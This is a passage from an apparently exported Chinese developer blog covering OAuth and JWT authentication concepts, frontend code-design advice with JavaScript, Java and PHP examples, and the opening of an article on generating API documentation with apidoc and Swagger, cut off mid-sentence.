是一个授权标准，而不是认证标准。提供资源的服务器不需要知道确切的用户身份（session），只需要验证授权服务器授予的权限（token）即可。</p><p><img src="/API设计/restful-api/api-authentication-authorization-credential/3686456467.png" alt="oauth.png"></p><p>上图只是 OAuth 的一个简化流程，OAuth 的基本思路就是通过授权服务器获取 access token 和 refresh token（refresh token 用于重新刷新access token），然后通过 access token 从资源服务器获取数据 。在特定的场景下还有下面几种模式：</p><ul><li>授权码模式（authorization code）</li><li>简化模式（implicit）</li><li>密码模式（resource owner password credentials）</li><li>客户端模式（client credentials）</li></ul><p>如果需要获取用户的认证信息，OAuth 本身没有定义这部分内容，如果需要识别用户信息，则需要借助另外的认证层，例如 OpenID Connect。</p><h3 id="验证-access-token"><a href="#验证-access-token" class="headerlink" title="验证 access token"></a>验证 access token</h3><p>在一些介绍OAuth 的博客中很少讲到资源服务器是怎么验证 access token 的。OAuth core 标准并没有定义这部分，不过在 OAuth 其他标准文件中提到两种验证 access token的方式。</p><p>在完成授权流程后，资源服务器可以使用 OAuth 服务器提供的 Introspection 接口来验证access token，OAuth服务器会返回 access token 的状态以及过期时间。在OAuth标准中验证 token 的术语是 Introspection。同时也需要注意 access token 是用户和资源服务器之间的凭证，不是资源服务器和授权服务器之间的凭证。资源服务器和授权服务器之间应该使用额外的认证（例如 Basic 认证）。<br>使用 JWT 验证。授权服务器使用私钥签发 JWT 形式的 access token，资源服务器需要使用预先配置的公钥校验 JWT token，并得到 token 状态和一些被包含在 access token 中信息。因此在 JWT 的方案下，资源服务器和授权服务器不再需要通信，在一些场景下带来巨大的优势。同时 JWT 也有一些弱点，我会在JWT 的部分解释。</p><h3 id="refresh-token-和-access-token"><a href="#refresh-token-和-access-token" class="headerlink" title="refresh token 和 access token"></a>refresh token 和 access token</h3><p>几乎所有人刚开始了解 OAuth 时都有一个一疑问，为什么已经有了 access token 还需要 refresh token 呢？</p><p>授权服务器会在第一次授权请求时一起返回 access token 和refresh token，在后面刷新 access token 时只需要 refresh token。 access token 和 refresh token 的设计意图是不一样的，access token 被设计用来客户端和资源服务器之间交互，而 refresh token 是被设计用来客户端和授权服务器之间交互。</p><p>某些授权模式下 access token 需要暴露给浏览器，充当一个资源服务器和浏览器之间的临时会话，浏览器和资源服务器之间不存在签名机制，access token 成为唯一凭证，因此 access token 的过期时间（TTL）应该尽量短，从而避免用户的 access token 被嗅探攻击。</p><p>由于要求 access token 时间很短，refresh token 可以帮助用户维护一个较长时间的状态，避免频繁重新授权。大家会觉得让 access token 保持一个长的过期时间不就可以了吗？实际上 refresh token 和 access token 的不同之处在于即使 refresh token 被截获，系统依然是安全的，客户端拿着 refresh token 去获取 access token 时同时需要预先配置的 secure key，客户端和授权服务器之前始终存在安全的认证。</p><h3 id="OAuth、Open-ID、OpenID-Connect"><a href="#OAuth、Open-ID、OpenID-Connect" class="headerlink" title="OAuth、Open ID、OpenID Connect"></a>OAuth、Open ID、OpenID Connect</h3><p>认证方面的术语实在太多，我在搭建自己的认证服务器或接入第三方认证平台时，有时候到完成开发工作的最后一刻都无法理解这些术语。</p><p>OAuth 负责解决分布式系统之间的授权问题，即使有时候客户端和资源服务器或者认证服务器存在同一台机器上。OAuth 没有解决认证的问题，但提供了良好的设计利于和现有的认证系统对接。</p><p>Open ID 解决的问题是分布式系统之间身份认证问题，使用Open ID token 能在多个系统之间验证用户，以及返回用户信息，可以独立使用，与 OAuth 没有关联。</p><p>OpenID Connect 解决的是在 OAuth 这套体系下的用户认证问题，实现的基本原理是将用户的认证信息（ID token）当做资源处理。在 OAuth 框架下完成授权后，再通过 access token 获取用户的身份。</p><p>这三个概念之间的关系有点难以理解，用现实场景来说，如果系统中需要一套独立的认证系统，并不需要多系统之间的授权可以直接采用 Open ID。如果使用了 OAuth 作为授权标准，可以再通过 OpenID Connect 来完成用户的认证。</p><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>在 OAuth 等分布式的认证、授权体系下，对凭证技术有了更多的要求，比如包含用户 ID、过期等信息，不需要再外部存储中关联。因此业界对 token 做了进一步优化，设计了一种自包含令牌，令牌签发后无需从服务器存储中检查是否合法，通过解析令牌就能获取令牌的过期、有效等信息，这就是JWT （JSON Web Token）。</p><p>JWT 是一种包含令牌（self-contained token），或者叫值令牌 （value token），我们以前使用关联到 session 上的 hash 值被叫做引用令牌（reference token）。</p><p><img src="/API设计/restful-api/api-authentication-authorization-credential/2349337477.png" alt="two-types-of-token.png"></p><p>简而言之，一个基本的JWT令牌为一段点分3段式结构。<br>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ<br>生成JWT 令牌的流程为</p><p><img src="/API设计/restful-api/api-authentication-authorization-credential/1625047913.jpg" alt="jwt.jpg"></p><ul><li>header json 的 base64 编码为令牌第一部分</li><li>payload json 的 base64 编码为令牌第二部分</li><li>拼装第一、第二部分编码后的 json 以及 secret 进行签名的令牌的第三部分</li></ul><p>因此只需要签名的 secret key 就能校验 JWT 令牌，如果在消息体中加入用户 ID、过期信息就可以实现验证令牌是否有效、过期了，无需从数据库/缓存中读取信息。因为使用了加密算法，所以第一、二部分即使被修改（包括过期信息）也无法通过验证。JWT 优点是不仅可以作为 token 使用，同时也可以承载一些必要信息，省去多次查询。</p><p>注意：</p><ul><li>JWT token 的第一、二部分只是 base64 编码，肉眼不可读，不应当存放敏感信息</li><li>JWT token 的自包含特性，导致了无法被撤回</li><li>JWT 的签名算法可以自己拟定，为了便于调试，本地环境可以使用对称加密算法，生产环境建议使用非对称加密算法</li></ul><p>JWT token 在微服务的系统中优势特别突出。多层调用的 API 中可以直接传递 JWT token，利用自包含的能力，可以减少用户信息查询次数；更重要的是，使用非对称的加密方式可以通过在系统中分发密匙的方式</p><h3 id="验证-JWT-token。"><a href="#验证-JWT-token。" class="headerlink" title="验证 JWT token。"></a>验证 JWT token。</h3><p>当然 OAuth 对 access token 等凭证所选用的技术并没有做出限制，OAuth 并不强制使用 JWT，在使用 JWT 自包含特性的优势时，必须考虑到 JWT 撤回困难的问题。在一些对撤回 token 要求很高的项目中不适合使用JWT，即使采用了一些方案实现（whitelist 和 blacklist）也违背了设计 JWT 的初衷。</p><h3 id="Cookie-、Token-in-Cookie、Session-Token-依然被使用"><a href="#Cookie-、Token-in-Cookie、Session-Token-依然被使用" class="headerlink" title="Cookie 、Token in Cookie、Session Token 依然被使用"></a>Cookie 、Token in Cookie、Session Token 依然被使用</h3><p>在构建 API 时，开发者会发现我们的认证方式和网页应用有一些不同，除了像 ajax 这种典型的 web 技术外，如果我们希望 API 是无状态的，不推荐使用 Cookie。</p><p>使用 Cookie 的本质是用户第一次访问时服务器会分配一个 Session ID，后面的请求中客户端都会带上这个 ID 作为当前用户的标志，因为 HTTP 本身是无状态的，Cookie 属于一种内建于浏览器中实现状态的方式。如果我们的 API 是用来给客户端使用的，强行要求 API 的调用者管理Cookie 也可以完成任务。</p><p>在一些遗留或者不是标准的认证实现的项目中，我们依然可以看到这些做法，快速地实现认证。</p><p>使用 cookie，例如 web 项目中 ajax 的方式<br>使用 session ID 或 hash 作为 token，但将 token 放入 header 中传递<br>将生成的 token （可能是JWT）放入 cookie 传递，利用 HTTPonly 和 Secure 标签保护 token</p><h2 id="选择合适的认证方式"><a href="#选择合适的认证方式" class="headerlink" title="选择合适的认证方式"></a>选择合适的认证方式</h2><p>随着微服务的发展，API 的设计不仅仅是面向 WEB 或者 Mobile APP，还有BFF（Backend for Frontend）和 Domain API 的认证，以及第三方服务的集成。</p><p>客户端到服务器之间认证和服务器到服务器之间认证是不同的。</p><p>我们把终端用户（Human）参与的通信，叫做 Human-to-machine (H2M)，服务器与服务器之间的通信叫做 Machine-to-machine (M2M)。</p><p>H2M 的通信需要更高的安全性，M2M 的通信天然比 H2M 安全，因此更多的强调性能，在不同的场合下选择合适的认证技术就显得特别重要。例如 HTTP Basic Authentication 用来作为 H2M 认证显得有些落后，但是在 M2M 中被大量使用。</p><p>另外值得一提的是，H2M 这种通信方式下，客户端不受控制，由于无法自主分发密匙，认证通信的安全高度依赖 HTTPS。</p><p>从一个宏观的角度看待他们的关系，对我们技术选型非常有帮助。</p><p><img src="/API设计/restful-api/api-authentication-authorization-credential/1165581663.png" alt="h2m-m2m.png"></p><h2 id="术语表"><a href="#术语表" class="headerlink" title="术语表"></a>术语表</h2><ul><li>Browser fingerprinting 通过查询浏览器的代理字符串，屏幕色深，语言等，然后这些值通过散列函数传递产生指纹，不需要通过 Cookie 就可以识别浏览器</li><li>MAC（Message authentication code） 在密码学中，讯息鉴别码，是经过特定算法后产生的一小段资讯，检查某段讯息的完整性</li><li>HOTP（HMAC-based One-time Password algorithm）基于散列消息验证码的一次性密码算法</li><li>Two-step verification 是一种认证方法，使用两种不同的元素，合并在一起，来确认使用者的身份，是多因素验证中的一个特例</li><li>OTP （One time password ）一次性密码，例如注册邮件和短信中的认证码</li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://swagger.io/docs/specification/authentication/basic-authentication/" target="_blank" rel="noopener">https://swagger.io/docs/specification/authentication/basic-authentication/</a></li><li><a href="https://www.ietf.org/rfc/rfc2104.txt" target="_blank" rel="noopener">https://www.ietf.org/rfc/rfc2104.txt</a> HMAC: Keyed-Hashing for Message Authentication</li><li><a href="https://www.ietf.org/rfc/rfc4226.txt" target="_blank" rel="noopener">https://www.ietf.org/rfc/rfc4226.txt</a> HOTP: An HMAC-Based One-Time Password Algorithm</li><li><a href="https://tools.ietf.org/html/rfc6287" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc6287</a> OCRA: OATH Challenge-Response Algorithm</li><li><a href="https://tools.ietf.org/html/rfc6749" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc6749</a> The OAuth 2.0 Authorization Framework</li><li><a href="https://tools.ietf.org/html/rfc7519" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7519</a> JSON Web Token (JWT)</li><li><a href="https://oauth.net/2/" target="_blank" rel="noopener">https://oauth.net/2/</a> OAuth 2.0</li><li><a href="https://tools.ietf.org/id/oauth" target="_blank" rel="noopener">https://tools.ietf.org/id/oauth</a> Internet-Draft Archive for OAuth</li></ul>]]></content>
      
      
      <categories>
          
          <category> API设计 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端的编程思维</title>
      <link href="/thinking/thinking/10-good-design-experence/"/>
      <url>/thinking/thinking/10-good-design-experence/</url>
      
        <content type="html"><![CDATA[<p>良好的代码设计可以大大减少维护的成本和潜在的bug，甚至由于积累效应会决定一个项目能否成功。在常年的codereview和查看面试作业你中发现，良好的设计和糟糕的代码设计的区别十分明显。</p><p>总结了几条实用的经验，希望对后面的项目有所帮助。文中例子使用 JavaScript 和 Java，示例仅做演示使用，这些例子都是实际遇到过的，做了一些简化。</p><p><img src="/thinking/thinking/10-good-design-experence/2054618301.png" alt="software-design.png"></p><h2 id="快速退出"><a href="#快速退出" class="headerlink" title="快速退出"></a>快速退出</h2><p>如果在一个方法中遇到大量的条件判断，正常的情况下都会想到使用嵌套if 语句或者使用 else if，但是这样一来就会出现非常复杂的嵌套。这在维护上带来了很大的麻烦。</p><pre><code>function getRecommendedProductCover(user){    const defaultCover = &#39;http://xxxx.jpg&#39;    if(user.type === &#39;merchant&#39;){        let product = getRecommendedProductByUser(user.id)        if(product &amp;&amp; product.picture){            if(product.picture.src){                return product.picture.src            }        }    }    return defaultCover}</code></pre><p>我们可以使用逆向思维来解决这个问题，如果条件满足就是用 return 快速退出。</p><pre><code>function getRecommendedProductCover(user){    const defaultCover = &#39;http://xxxx.jpg&#39;    if(user.type !== &#39;merchant&#39;){        return defaultCover    }    let product = getRecommendedProductByUser(user.id)    if(!product || !product.picture){        return defaultCover    }    if(product.picture.src){        return product.picture.src    }else{        return defaultCover    }}</code></pre><p>当然还可以使用一些中间变量等方法解决嵌套的问题，这种方式可以让代码看起来更加直观、简洁，有时候也可以避免无意义的数据获取。</p><h2 id="消除-if-和-else-if"><a href="#消除-if-和-else-if" class="headerlink" title="消除 if 和 else if"></a>消除 if 和 else if</h2><p>我们看一个前端模板中非常常见的一种写法，我在大量的面试作业中出现。</p><pre><code>state = {index: 1};render() {    const {index} = this.state;    return (        &lt;div className=&quot;tab-list&quot;&gt;            &lt;Navigation index={index} onChange={index =&gt; this.setState({index})}/&gt;            {index === 0 &amp;&amp; &lt;div&gt;Tab1 content&lt;/div&gt;}            {index === 1 &amp;&amp; &lt;div&gt;Tab2 content&lt;/div&gt;}            {index === 2 &amp;&amp; &lt;div&gt;Tab3 content&lt;/div&gt;}            {index === 3 &amp;&amp; &lt;div&gt;Tab4 content&lt;/div&gt;}        &lt;/div&gt;    );}</code></pre><p>这是我在一份前端作业中遇到的一个标签页切换的例子，短路运算符相当于 if 语句，显然作者把这个列表中每一个元素拿出来做了一次判断。这个逻辑显然使用循环就可以简单优雅的实现。</p><p>我们再来看另外一个常见的例子。</p><pre><code>function handleErrorMessage(response){    if(response.status === &#39;401&#39;){        alert(&#39;没有登录&#39;)    }else if(response.status === &#39;403&#39;){        alert(&#39;没有权限&#39;)    }else if(response.status === &#39;500&#39;){        alert(&#39;内部错误&#39;)    }else{        alert(&#39;未知错误&#39;)    }}</code></pre><p>这个例子在前端的项目中非常常见，但不一定是处理错误消息，处理这种场景也非常简单，使用一个Map对象来做一个映射即可大大提高程序的维护性。</p><p>下面一个例子更加具有代表性，如果我们需要在页面上预览不同的媒体格式，在 mediaPreview 方法中可能会写的非常复杂。</p><pre><code>function mediaPreview(object){    if(object.type === &#39;video&#39;){        ...    }    if(object.type === &#39;picture&#39;){        ...    }    ...}</code></pre><p>这个时候我们可以借助更为高级的设计模式，将不同类型的处理逻辑隔离在单独的模块中，同样可以使用一个Map对象来维护一个具体实现逻辑的列表。</p><pre><code>const previewMethods{    video: function(){      ...    },    picture: function(){      ...    }}function mediaPreview(object){    previewMethods[object.type]()}</code></pre><p>是不是看起来像某种设计模式了呢。</p><h2 id="分层设计"><a href="#分层设计" class="headerlink" title="分层设计"></a>分层设计</h2><p>分层设计是一种经典的程序设计，Java 服务器编程中往往有 presentation、service和dao层，现代前端也会用redux等框架来对数据和视图进行分层。</p><p>那什么样的设计是易于维护的分层设计呢？我们先看一个反面的例子。</p><pre><code>public class ProductService {    public void updateProduct(HttpServletRequest httpServletRequest) {        String queryString = httpServletRequest.getQueryString();        ...    }}</code></pre><p>在一次 codereview 中看到这样一段代码，逻辑是需要在service中根据条件更新商品，作者可能为了省事儿，直接把 HttpServletRequest 这个对象在各个参数中直接传递，虽然这样看起来避免了冗余的value object定义，以及减少了参数的数量。但这样做的后果是 ProductService 和 ServletRequest 耦合了，从而造成这个service失去了复用的能力。</p><p><img src="/thinking/thinking/10-good-design-experence/3856113184.png" alt="layers.png"></p><p>正确的做法是自定义一个条件类，或者直接把查询条件放到，参数列表上。</p><pre><code>public class ProductService {    public void updateProduct(String productId, String userId) {        ...    }}</code></pre><p>回到我们的问题，什么是好的分层设计呢？答案是每个层能被无痛的替换。以在Java 后端中的presentation层为例，一套使用表单和JSP 模板的presentation层，如果具有良好的设计可以容易的被替换成RESTful的API 而不用对service层做任何修改。</p><p>软件设计领域，最好的分层设计应该像 TCP/IP 协议族那样，每层都可以有不同的实现，所以我们才能做到WIFI和4G网络都能访问Google。</p><p><img src="/thinking/thinking/10-good-design-experence/330607470.png" alt="tcp-ip.png"></p><h2 id="作用域隔离"><a href="#作用域隔离" class="headerlink" title="作用域隔离"></a>作用域隔离</h2><p>前端开发，或者其他弱类型语言如PHP，在模块和包管理上没有语言层面足够的支持。需要特别注意作用域的暴露，先给一个前不久维护一个遗留项目中的一个例子。</p><p>其中一个 js 文件中有一个变量</p><pre><code>// a.jsvar isWebview = (window.navigator.userAgent.indexOf(&#39;_APP&#39;) !== -1)if(isWebview){    ...}</code></pre><p>后来在另外一个 js文件中也定义了isWebview方法，造成冲突。</p><pre><code>// b.jsfunction isWebview(){     return (window.navigator.userAgent.indexOf(&#39;_APP&#39;) !== -1)}</code></pre><p>由于JavaScript的类型转换 a.js 中的条件判断，就会一直当做 true。</p><p>在JavaScript中解决的方法其实很简单，可以使用function创建一个局部作用域空间，这也是前端包管理的基本原理。</p><pre><code>!(function(){    var isWebviewg = (window.navigator.userAgent.indexOf(&#39;_APP&#39;) !== -1)    console.log(isWebviewg)    //  创建一个局部作用域，使用 window 向外部暴露接口    window.xxx = ...})</code></pre><p>实际上前端开发中尽量应避免使用window对象。</p><h2 id="编写一个合格函数"><a href="#编写一个合格函数" class="headerlink" title="编写一个合格函数"></a>编写一个合格函数</h2><p>编写函数谁不会，然而我在面试作业中碰到了这样的例子。</p><pre><code>public class Utils {    public void modifyScore(Answer answer) {        answer.setScore(answer.getScore() + 10)        ...    }}</code></pre><p>这是一份 Java 作业，作者编写了一个Util 方法来修改答案的分数，但是这个方不是静态方法，甚至没有返回值，直接对传入的对象进行修改。</p><pre><code>var formData = {    phone:&#39;123456&#39;,    ...}function validateForm(){    var phoneRegx = /xxxx/    var valid = honeRegx.test(ormData.phone)    ...    return valid}</code></pre><p>这是一份 JavaScript 作业，作者拆分了验证表单的方法，但是这个方法访问了外部变量，让这个方法的拆分变得毫无意义。</p><p>好的函数或者方法，一定是通过参数获取输入，通过返回值输出数据，函数体内部不应该和外部有任何联系。</p><h2 id="程序上下文"><a href="#程序上下文" class="headerlink" title="程序上下文"></a>程序上下文</h2><p>在软件开发领域，有一个概念一直没有得到重视，那就是我们编写应用程序就像撰写文章，是有一个上下文存在的。</p><p>使用了Spring boot 会产生一个Spring 上下文来管理Beans并提供了其他特性。使用了 Redux 也会存在Redux这样一个上下文。</p><p>我们再编写代码时，始终需要意识到这个上下文的存在。才能最大的利用框架和库提供的特性，但是也需要时刻警惕这个上下文中的一些限制。</p><p>例如在前端开发中，很多UI框架提供了组件的两种引用方式。一种是全局的载入和配置，第二种是可以局部单独引入构建更为复杂的应用。</p><p>在一些遗留的项目中，需要注意多套技术栈共同的存在，项目中往往多个上下文存在。编写一些公用的代码时，尽量剥离上下文的依赖和使用函数式编程，这样可以做到跨上下文复用，也可以未来跨项目使用。</p><p>我们一个项目因为历史遗留的问题一些JavaScript使用的ES5编写的，另外一些使用了ES6和打包工具编写的。在一些公共模块就难以做到复用，于是我们只能将ES6的代码从上下文中剥离（例如重新引入依赖库）打包成独立的JS UMD包文件供ES5通过scripts引入。</p><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>在项目中大量拼接字符串，会造成代码的可读性可维护性降低。</p><p>例如前端在处理URL时的问题：</p><pre><code>const urls = {    PRODUCTS:&#39;/products/&#39;  }function fetchProductDetail(productID){    return fetch(urls.PRODUCTS+productID)}</code></pre><p>上面的例子中需要拼接详情的URL地址，且无法体现detail资源中的path参数。字符串的处理应该尽量避免使用+操作符链接字符串，而是使用模板来处理，模板可以用任何地方而不只是输出。</p><p>这里编写了一个处理URL path 参数的小方法。</p><pre><code>const urls = {    PRODUCTS:&#39;/products/&#39;，    PRODUCTS_DETAIL:&#39;/products/:id&#39;  }function fetchProductDetail(productID){    return fetch(paramsPath(urls.PRODUCTS_DETAIL,productID))}function paramsPath(pathString, ...params) {  let result = pathString  params.forEach((value) =&gt; {    result = result.replace(/\:\w+/, value)  })  return result}</code></pre><p>JavaScript 成熟的模板库非常多，例如Ejs、Handlebars、underscore中template.不要仅仅在视图中使用模板，而是需要处理字符串的地方都可以使用。</p><h2 id="理解接口"><a href="#理解接口" class="headerlink" title="理解接口"></a>理解接口</h2><p>在项目中我们容易走进一个误区，看到一个场景觉得挺适合一种设计模式的，于是就引入一种设计模式。</p><p>首先，很多设计模式之间的区别非常微妙，同一种场景可以使用不同的设计模式实现。例如策略模式和门面模式某些时候很难区分。</p><p>其次，有时候我们不需要一个设计模式完整的实现，可以参考这种设计模式的思想做一些定制。</p><p>在使用模式之前需要彻底理解的是面向对象，特别是继承和接口。由于JavaScript没有语言层面的的 interface，但实际山接口无处不在。</p><p>比如，如果一组信息需要渲染给显示器和打印机等不同的设备，我们可能这样写。</p><pre><code>const PrintViewer = {  render(){    ...  }}const BrowserViewer = {  render(){    ...  }}function render(){  // 使用工厂方法获取不同的渲染对象  const reviewer =  this.getViewer()  reviewer.render(this.data)}</code></pre><p>在前端开发中，如果不使用TypeScript 等类型工具，我们无法做到在语法层面上检查每个 viewer 都有render方法。但是如果想让程序正确运行，我们不得不在团队中约定，viewer 比如提供一个render 方法。</p><p><strong>在软件开发中，接口实际上是一种约定。</strong></p><p><img src="http://www.printf.cn/usr/uploads/2019/02/4033133885.png" alt="interface.png"></p><p>在现实世界中接口是通信设备和零件之间的契约</p><h2 id="复用的陷阱"><a href="#复用的陷阱" class="headerlink" title="复用的陷阱"></a>复用的陷阱</h2><p>在做前端开发的时候非常容易陷入一个误区，就是把视图拆分成独立的组件，拆分代码这个实践没有问题，但是应该注意为何而拆。</p><p>比如我们有一个数据列表页面，这个页面上大致有筛选部分、内容部分、分页部分，在codereview 中看到过一个 vue 的案例，有人把一个也买的呢头部、中部、底部拆分成不同的组件，但是这些组件是当前页面内部和业务相关的，只是不同的部分而已。</p><p>拆分之后各个组件的数据又需要通过props和event来传递，带来了额外的负担。</p><p>因此我们在组件拆分的时候，需要考虑以下几点：</p><ol><li>拆分出的组件是否和业务有关联，如果和业务关联需要进行剥离</li><li>从业务代码中抽离组件，而不是提前设计组件</li><li>考虑组件拆分的成本和收益，组件拆分后会带来组件之间通信、可读性下降等潜在成本</li></ol><p><img src="/thinking/thinking/10-good-design-experence/889408754.png" alt="components.png"></p><h2 id="起一个好名字"><a href="#起一个好名字" class="headerlink" title="起一个好名字"></a>起一个好名字</h2><p>曾经接手过一个遗留项目，这个项目的原作者我猜测应该是广东人，因为变量命名的风格太过于清奇。变量名中不仅有英文简写（不完整的单词例如 btn ）、数字和拼音，更为恐怖的是驼峰和下划线混用，甚至拼音都不是普通话。</p><pre><code>$sqlus = &quot;xxx&quot;;$rsus = mysql_query($sqlus);$countus = mysql_fetch_assoc($rsus);$usercxpass = $countus[&quot;cx_pass&quot;] . &#39;,&#39; . $pa_cjh;//车架A$arr = array($countus[&quot;cx_pass&quot;]);//编码数组$arrsl = explode(&quot;,&quot;,$countus[&quot;cx_shul&quot;]);//品牌查询次数数组/////////////////pdcxsz////////////////////////$arrnull = array();//空数组foreach ($arrsl as $key =&gt; $values) {//查询并写入新    if (strstr($values, $pa_pingp) !== false) {        array_push($arrnull, $values);    }}if ($arrnull[0] == &quot;&quot; and $countus[&quot;cx_date&quot;] == $l_date1) {//日期当前不存在就写入    $arrsl[] = $pa_pingp . &#39;1&#39;;//写入新查询//  print_r($arrsl);} elseif ($countus[&quot;cx_date&quot;] &lt;&gt; $l_date1) {//日期之前不存在就写入    $arrsl = array($pa_pingp . &#39;1&#39;);//写入新查询} elseif ($arrnull[0] &lt;&gt; &quot;&quot; and $countus[&quot;cx_date&quot;] == $l_date1) {//存在就修改    $czxincs = substr($arrnull[0], -1);//实已查    $dqppkey = array_search($arrnull[0], $arrsl);//已查当前分健值//  echo $czxincs.&#39;&lt;br /&gt;&#39;;    $arrsl[$dqppkey] = $pa_pingp . ($czxincs + 1);//更新数组}</code></pre><p>我想上面这段代码几乎没人看懂，所以起一个好的名字对维护性非常重要，所以在变量命名时最好遵循下面的规则：</p><ol><li>使用一种命名风格，驼峰或者下划线</li><li>避免使用拼音和数字</li><li>避免使用缩略词</li><li>注意单词错误、时态和大小写</li></ol><p>另外有的时候实在想不出变量名，可以借助一些工具，例如 <a href="https://unbug.github.io/codelf/" target="_blank" rel="noopener">https://unbug.github.io/codelf/</a> 提供了浏览器和编辑器插件，可以从开源代码库中搜索一些有用的代码作为参考。</p><p>另外一种我比较喜欢的命名方式是参考一些标准写法。“微格式”是一种互联网“潜规则”，用于赋予HTML元素有意义的名字便于第三方应用程序或搜索引擎抓取。所以我在编写前端代码时，参考微格式不用费脑筋设计HTML结构和命名，同时也有让HTML足够语义化。</p><p><img src="/thinking/thinking/10-good-design-experence/739818415.png" alt="namming.png"></p><p>图片来源：<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/microformats" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTML/microformats</a></p>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>API 文档和前后端协作</title>
      <link href="/API%E8%AE%BE%E8%AE%A1/restful-api/api-design-document-and-contract/"/>
      <url>/API%E8%AE%BE%E8%AE%A1/restful-api/api-design-document-and-contract/</url>
      
        <content type="html"><![CDATA[<p>在上一篇文章——《细说API - 重新认识RESTful》中介绍了如何理解和设计RESTful风格的API，现在我们来聊聊如何有效的呈现API文档，以及前后端协作的方式。</p><p>我经历过一些没有文档的项目，前后端开发者坐到一起口口相传，或者有些团队用 word、pdf 来编写 API 文档。API 文档的缺乏给前后端协作带来困难，在缺乏专门工具的情况下，编写和维护文档是一件工作量巨大的事，人工处理也非常容易出错。<br>本文将会介绍三种方案来解决前后端协作的问题：</p><ul><li><strong>基于注释的 API 文档</strong>：这是一种通过代码中注释生成 API 文档的轻量级方案，它的好处是简单易用，基本与编程语言无关。因为基于注释，非常适合动态语言的文档输出，例如 Nodejs、PHP、Python。由于NPM包容易安装和使用，这里推荐 nodejs 平台下的 apidocjs。</li><li><strong>基于反射的 API 文档</strong>：使用 swagger 这类通过反射来解析代码，只需要定义好 Model，可以实现自动输出 API 文档。这种方案适合强类型语言例如 Java、.Net，尤其是生成一份稳定、能在团队外使用的 API 文档。</li><li><strong>使用契约进行前后端协作</strong>：在团队内部，前后端协作本质上需要的不是一份 API 文档，而是一个可以供前后端共同遵守的契约。前后端可以一起制定一份契约，使用这份契约共同开发，前端使用这份契约 mock API，后端则可以通过它简单的验证API是否正确输出。</li></ul><p><img src="/API设计/restful-api/api-design-document-and-contract/1089010597.png" alt="api-document.png"></p><h2 id="基于注释的-API-文档"><a href="#基于注释的-API-文档" class="headerlink" title="基于注释的 API 文档"></a>基于注释的 API 文档</h2><p>apidocjs 是生成文档最轻量的一种方式，apidocjs 作为 npm 包发布，运行在 nodejs 平台上。原理为解析方法前面的注释，使用方法非常类似 javadoc 等程序接口文档生成工具，配置和使用都非常简单。因为只是解析代码注释部分，理论上和编程语言无关。</p><p>安装：</p><blockquote><p>npm install apidoc -g</p></blockquote><p>在需要输出文档的源代码中添加一个一个注释示例：</p><p><img src="/API设计/restful-api/api-design-document-and-contract/1399785923.png" alt="apidoc-demo.png"></p><p>最小化运行：</p><blockquote><p>apidoc -i myapp/ -o apidoc</p></blockquote><p>即可在 apidoc 中输出静态的 html 文档目录。如果指定配置文件 apidoc.json 可以定义更多的操作方式，也可以自定义一套 HTML 模板用于个性化显示你的 API 文档，另外在输出的 HTML 文档中附带有API请求的测试工具，可以在我们生成的文档中尝试调用 API。</p><p><img src="/API设计/restful-api/api-design-document-and-contract/1155147223.png" alt="apidoc-html-demo.png"></p><p>使用 apidocjs 只需要添加几个例如 @api、@apiname、@apiParam 等几个必要的注释即可，值得一提是 @apiDefine 可以定义变量避免重复书写，@apiGroup 用来对 API 分组，@apiVersion 可以再生成不同版本的文档。</p><h2 id="基于反射的-API-文档"><a href="#基于反射的-API-文档" class="headerlink" title="基于反射的 API 文档"></a>基于反射的 API 文档</h2><p>apidoc 的缺点是需要维护一些注释，当修改源代码时需要注意注释是否同时被更新。不过如果你使用的是 Java、.Net 等强类型语言，就可以利用强类型语言的优势。<br>在这个领域最好用的文档工具当属 swagger，swagger 实际上是一整套关于 API 文档、代码生成、测<br>试、文档共享的工具包，包括 :</p><ul><li>Swagger Editor 使用 swagger editor 编写文档定义 yml 文件，并生成 swagger 的 json 文件</li><li>Swagger UI 解析 swagger 的 json 并生成 html 静态文档</li><li>Swagger Codegen 可以通过 json 文档生成 Java 等语言里面的模板文件（模型文件）</li><li>Swagger Inspector API 自动化测试</li><li>Swagger Hub 共享 swagger 文档</li></ul><p>通常我们提到 swagger 时，往往指的是 swagger ui。而在 Java 环境下，可以通过 Springfox 来完成对代码的解析，再利用 swagger 生成文档，下面我们给一个简单的例子看怎么给一个 Spring boot 项目生成文档。</p><p>首选加入依赖（gradle 同理）：</p><p><img src="/API设计/restful-api/api-design-document-and-contract/1041329563.png" alt="swagger-xml.png"></p><p>全局配置：</p><p><img src="/API设计/restful-api/api-design-document-and-contract/2234607907.png" alt="swagger-config.png"></p><p>我们的 controller，需要定义一些必要的注解来描述这个 API 的标题和解释，我们返回的 user 对象是一个简单 value object，swagger-annotations 包下面提供了很多注解可以满足更多的定制需求。</p><p><img src="/API设计/restful-api/api-design-document-and-contract/3150467476.png" alt="swagger-endpoint.png"></p><p>然后访问你的 context 下的 /{context}/swagger-ui.html 页面，你会看到一个漂亮的 API 在线文档。swagger 的文档上能看到具体的字段定义和 Model，如果修改了 Model，再次编译后则可以自动反应到文档上，这也是反应了强类型编程语言的优势之一。</p><p><img src="/API设计/restful-api/api-design-document-and-contract/968599917.png" alt="swagger-html-demo.png"></p><h2 id="基于契约的前后端协作"><a href="#基于契约的前后端协作" class="headerlink" title="基于契约的前后端协作"></a>基于契约的前后端协作</h2><p>在过去的开发中，往往是后端开发者占主导，像上面的两种方案中，直接注释、反射通过生成 API 文档。<br>但前后端分离后让合作方式发生了变化。传统的方式往往是服务器开发者完成了 API 